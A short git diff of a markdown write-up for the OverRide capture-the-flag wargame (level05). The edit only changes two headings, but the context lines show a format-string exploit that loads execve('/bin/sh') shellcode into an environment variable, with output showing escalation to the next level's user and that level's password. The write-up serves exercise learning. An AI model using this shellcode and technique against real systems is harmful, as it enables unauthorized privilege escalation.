@@ -104,7 +104,7 @@ Devide the address per byte  and calculate for each number of characters that ne
 0xff -> 0x2ff-16-259-203-33 = 256
 ```
 
-# Exploit
+## Exploit
 ```shell
 level05@OverRide:~$ export SHELL_CODE=$(python -c "print '\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
 level05@OverRide:~$ ./getenv SHELL_CODE
@@ -115,7 +115,7 @@ uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=10
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
 
-# Addendum
+## Addendum
 ```c
 #include <stdio.h>
 #include <stdlib.h>
